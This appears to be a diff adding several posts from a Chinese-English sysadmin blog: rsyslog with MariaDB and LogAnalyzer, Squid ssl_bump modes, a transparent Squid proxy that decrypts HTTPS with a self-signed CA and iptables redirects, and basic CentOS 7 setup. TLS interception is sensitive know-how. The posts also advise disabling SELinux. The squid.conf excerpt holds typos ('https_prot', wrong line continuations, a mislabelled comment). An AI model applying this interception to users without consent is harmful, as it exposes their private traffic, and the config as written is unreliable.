+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line">yum install mariadb-server php-mysql rsyslog-mysql</span><br><span class="line">mysql_secure_installation</span><br><span class="line">mysql -u root -p  #Login </span><br></pre></td></tr></table></figure>
+
+<p>In this project , phpMyAdmin version is 4.9 , php version need 5.5 or later.<br>Download phpMyAdmin setup file from official website , and extract to /var/www , browse $SERVER_IP/phpmyadmin/setup to set configuration.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p logdb &lt;/usr/share/doc/rsyslog/mysql-createDB.sql #create database</span><br><span class="line">mv config.php config.php.backup   #re-configure</span><br><span class="line">touch config.php</span><br></pre></td></tr></table></figure>
+<p>Edit rsyslog.conf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#load ommysql module</span><br><span class="line">$ModLoad ommysql</span><br><span class="line">#:ommysql:資料庫IP,資料庫名,使用者名稱,密碼</span><br><span class="line">kern.=notice :ommysql:localhost,logdb,$dbuser,$dbpassword</span><br></pre></td></tr></table></figure>
+
+<h2 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h2><p><img src="https://i.imgur.com/30yGy6y.png"><br><img src="https://i.imgur.com/Cmerkeh.png"><br><img src="https://i.imgur.com/fzN7pEO.png"></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://www.netadmin.com.tw/netadmin/zh-tw/feature/899D50D1860F403DB5B138D50D21F43F?page=1">自行架設LogAnalyzer日誌管理伺服器</a><br><a target="_blank" rel="noopener" href="https://www.netadmin.com.tw/netadmin/zh-tw/technology/7FEA19007FA641779EB719E77C50709E">LogAnalyzer日誌分析工具安裝設定詳解</a><br><a target="_blank" rel="noopener" href="https://blog.gtwang.org/linux/centos-7-install-mariadb-mysql-server-tutorial/">CentOS Linux 7 安裝 MySQL/MariaDB 資料庫教學</a><br><a target="_blank" rel="noopener" href="https://ssorc.tw/1204">rsyslog+mysql+loganalyzer記錄系統log至資料庫並由web介面呈現</a></p>
+
+      
+    </div>
+	
+    <!--
+	
+    -->
+    <!--
+    
+      <footer class="article-footer">
+      </footer>
+    
+    -->
+  </div>
+  
+</article>
+
+
+
+    
+      <article id="post-ssl-bump" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <myh11 itemprop="name">
+      <a class="article-title-index" href="/2019/08/13/ssl-bump/"><strong>ssl-bump</strong></a>
+      <small class=article-date-index>&nbsp; 2019-08-13</small>
+      <!--<a>
+      <div = post.date  </div>
+      </a>-->
+      <br>
+      <br> <!-- blair add -->
+    </myh11>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      <!--<a href="/2019/08/13/ssl-bump/" class="article-date">
+  <time datetime="2019-08-13T09:29:39.000Z" itemprop="datePublished">2019-08-13</time>
+</a>-->
+      <!--
+-->
+      <!--
+      
+      -->
+    </div>
+	
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="peek"><a href="#peek" class="headerlink" title="peek"></a>peek</h2><p>When a peek rule matches during step1, Squid proceeds to step2 where it parses the TLS Client Hello and extracts SNI (if any). When a peek rule matches during step 2, Squid proceeds to step3 where it parses the TLS Server Hello and extracts server certificate while preserving the possibility of splicing the client and server connections; peeking at the server certificate usually precludes future bumping (see Limitations).</p>
+<h2 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h2><p>Become a TCP tunnel without decoding the connection. The client and the server exchange data as if there is no proxy in between.</p>
+<h2 id="bump"><a href="#bump" class="headerlink" title="bump"></a>bump</h2><p>Establish a TLS connection with the server (using client SNI, if any) and establish a TLS connection with the client (using a mimicked server certificate). However, this is not what actually happens right now if a bump rule matches during step1.</p>
+<h2 id="terminate"><a href="#terminate" class="headerlink" title="terminate"></a>terminate</h2><p>Close client and server connections.</p>
+<p>關閉client與server的連線</p>
+<h2 id="stare"><a href="#stare" class="headerlink" title="stare"></a>stare</h2><p>When a stare rule matches during step1, Squid proceeds to step2 where it parses the TLS Client Hello and extracts SNI (if any). When a stare rule matches during step2, Squid proceeds to step3 where it parses the TLS Server Hello and extracts server certificate while preserving the possibility of bumping the client and server connections; staring at the server certificate usually precludes future splicing (see Limitations).</p>
+<h2 id="情境劇stare-and-bump"><a href="#情境劇stare-and-bump" class="headerlink" title="情境劇stare and bump"></a>情境劇stare and bump</h2><p>stare在step3時將所有連線設定為splice，也就是一般的TCP Tunnel連線，若現在要與某一網站進行bump，bump設定將至於stare與splice之間，如此即可達到指定網站bump的功能。</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=xm_wEezrWf4">Squid, SquidGuard, and Lightsquid on pfSense 2.4</a><br><a target="_blank" rel="noopener" href="https://wiki.squid-cache.org/Features/SslPeekAndSplice">SslBump Peek and Splice</a><br><a target="_blank" rel="noopener" href="http://www.squid-cache.org/Doc/config/ssl_bump/">Squid configuration directive ssl_bump</a></p>
+
+      
+    </div>
+	
+    <!--
+	
+    -->
+    <!--
+    
+      <footer class="article-footer">
+      </footer>
+    
+    -->
+  </div>
+  
+</article>
+
+
+
+    
+      <article id="post-squid-on-CentOS-7" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <myh11 itemprop="name">
+      <a class="article-title-index" href="/2019/08/08/squid-on-CentOS-7/"><strong>squid on CentOS 7</strong></a>
+      <small class=article-date-index>&nbsp; 2019-08-08</small>
+      <!--<a>
+      <div = post.date  </div>
+      </a>-->
+      <br>
+      <br> <!-- blair add -->
+    </myh11>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      <!--<a href="/2019/08/08/squid-on-CentOS-7/" class="article-date">
+  <time datetime="2019-08-08T09:27:36.000Z" itemprop="datePublished">2019-08-08</time>
+</a>-->
+      <!--
+  <div class="article-category-index">
+    <a class="article-category-index-link" href="/categories/%E6%9C%8D%E5%8B%99%E5%BB%BA%E7%BD%AE/">服務建置</a>
+  </div>
+
+-->
+      <!--
+      
+      -->
+    </div>
+	
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>Client不用設定 Proxy 伺服器 IP，即可讓client之流量皆經由squid發送，並對一特定網站限制連線，本機系統使用 CentOS 7.6。</p>
+<h2 id="系統建置"><a href="#系統建置" class="headerlink" title="系統建置"></a>系統建置</h2><p>CentOS 7.6(need NetworkAdapter *2) <a target="_blank" rel="noopener" href="https://hackmd.io/@0zewB80fSB2qjONXd8dXPw/Sk2dmULmB">CentOS 7 建置筆記</a></p>
+<p>Enable ipv4_forward</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure>
+<p>加入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>
+<p>apply</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -p /etc/sysctl.conf</span><br></pre></td></tr></table></figure>
+
+<h2 id="Squid-Intercept-原理"><a href="#Squid-Intercept-原理" class="headerlink" title="Squid Intercept 原理"></a>Squid Intercept 原理</h2><p>用戶端不需設定proxy相關設定，所有http與https流量由NAT導向至proxy Server，proxy Server將成為LAN與WAN之中間人(squid-in-the-middle)，此一功能除可避免手動設定proxy外，也可提升安全性需求。</p>
+<h3 id="squid-設定"><a href="#squid-設定" class="headerlink" title="squid 設定"></a>squid 設定</h3><p>squid.conf(add in config part )</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http_port 3128 intercept #for http </span><br><span class="line"></span><br><span class="line">https_prot 3129 intercept ssl-bump /</span><br><span class="line">generate-host-certificates=on dynamic_cert_mem_cache_size=16MB /</span><br><span class="line">cert=/etc/squid/ssl_cert/gss.com.cert /</span><br><span class="line">key=/etc/squid/ssl_cert/myCA.key  #for http</span><br><span class="line"></span><br><span class="line">#Configure SSL Bump </span><br><span class="line">always_direct allow all        #forward all request</span><br><span class="line">acl bump_sites dstdomain &quot;/etc/squid/ssl_cert/bump_sites.txt&quot; #forbid domain</span><br><span class="line">acl step1 at_step SslBump1     #connect client first</span><br><span class="line">ssl_bump peek step1</span><br><span class="line">ssl_bump bump bump_sites</span><br></pre></td></tr></table></figure>
+
+<h2 id="make-certificate-openSSL"><a href="#make-certificate-openSSL" class="headerlink" title="make certificate(openSSL)"></a>make certificate(openSSL)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out myCA.key 2048</span><br><span class="line">openssl req -new -key myCA.key -out gss.com.csr</span><br><span class="line">openssl x509 -req -days 365 -in gss.com.csr -signkey myCA.key -out gss.com.cert</span><br></pre></td></tr></table></figure>
+<p>產生出cert後，client端需匯入此憑證。</p>
+<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>將LAN端port 80(http)與443(https)流量導向至squid</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -i ens37 -p tcp --dport 80 -j REDIRECT --to-port 3128</span><br><span class="line">iptables -t nat -A PREROUTING -i ens37 -p tcp --dport 443 -j REDIRECT --to-port 3129</span><br><span class="line">iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE</span><br></pre></td></tr></table></figure>
+
+<h2 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h2><p><img src="https://i.imgur.com/0oXUv8O.png"></p>
+<h2 id="備忘錄"><a href="#備忘錄" class="headerlink" title="備忘錄"></a>備忘錄</h2><ol>
+<li>CentOS 7 系統有default iptables rules，建議先全部清除。</li>
+<li>當前模式為intercept，若client端指定proxy ip，則流量將被squid forbid，所以當squid為transparent(intercept)mode時，就不應該手動設定proxy ip 。</li>
+<li>要清楚是squid本身擋掉封包，還是iptables。(善用wireshark與access.log)</li>
+<li>SELinux要關閉。</li>
+</ol>
+<h2 id="參考文獻"><a href="#參考文獻" class="headerlink" title="參考文獻"></a>參考文獻</h2><p><a target="_blank" rel="noopener" href="https://wiki.squid-cache.org/ConfigExamples/Intercept/LinuxRedirect#Squid_Configuration_File">wiki squid(NAT REDIRECT)</a><br><a target="_blank" rel="noopener" href="https://wiki.squid-cache.org/ConfigExamples/Intercept/LinuxDnat">wiki squid(DNAT)</a><br><a target="_blank" rel="noopener" href="https://www.agix.com.au/minimal-transparent-squid-proxy-with-ssl-interception-bumping-on-centos-7/">build squid proxy with ssl bumping</a><br><a target="_blank" rel="noopener" href="http://zoufeng.net/2017/09/23/squid-proxy-with-ssl-bump/">squid正向代理</a><br><a target="_blank" rel="noopener" href="http://blog.faq-book.com/?p=5308">acl 設定</a><br><a target="_blank" rel="noopener" href="https://www.zybuluo.com/delight/note/2649">squid SSL相關特性</a><br><a target="_blank" rel="noopener" href="http://www.squid-cache.org/Doc/config/ssl_bump/">Squid configuration directive ssl_bump</a></p>
+
+      
+    </div>
+	
+    <!--
+	
+    -->
+    <!--
+    
+      <footer class="article-footer">
+      </footer>
+    
+    -->
+  </div>
+  
+</article>
+
+
+
+    
+      <article id="post-CentOS-7-基本環境建置" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <myh11 itemprop="name">
+      <a class="article-title-index" href="/2019/08/06/CentOS-7-%E5%9F%BA%E6%9C%AC%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE/"><strong>CentOS 7 基本環境建置</strong></a>
+      <small class=article-date-index>&nbsp; 2019-08-06</small>
+      <!--<a>
+      <div = post.date  </div>
+      </a>-->
+      <br>
+      <br> <!-- blair add -->
+    </myh11>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      <!--<a href="/2019/08/06/CentOS-7-%E5%9F%BA%E6%9C%AC%E7%92%B0%E5%A2%83%E5%BB%BA%E7%BD%AE/" class="article-date">
+  <time datetime="2019-08-06T09:36:36.000Z" itemprop="datePublished">2019-08-06</time>
+</a>-->
+      <!--
+  <div class="article-category-index">
+    <a class="article-category-index-link" href="/categories/%E7%B3%BB%E7%B5%B1%E5%BB%BA%E7%BD%AE/">系統建置</a>
+  </div>
+
+-->
+      <!--
+      
+      -->
+    </div>
+	
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="字型與字型大小"><a href="#字型與字型大小" class="headerlink" title="字型與字型大小"></a>字型與字型大小</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi .bash_profile</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if</span><br><span class="line">    setfont sun12x22 //man setfont取得更多說明</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<h2 id="網路介面設定"><a href="#網路介面設定" class="headerlink" title="網路介面設定"></a>網路介面設定</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmcli d //檢視網路介面啟動狀態</span><br><span class="line">nmtui //設定程式</span><br><span class="line">ip a //檢視網路卡當前ip address以及netmask</span><br></pre></td></tr></table></figure>
+<p>網路卡設定檔路徑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/sysconfig/network-scripts/ifcfg-**AdapterName**</span><br></pre></td></tr></table></figure>
+
+<h2 id="安裝vim"><a href="#安裝vim" class="headerlink" title="安裝vim"></a>安裝vim</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install vim</span><br></pre></td></tr></table></figure>
       
     </div>
 	
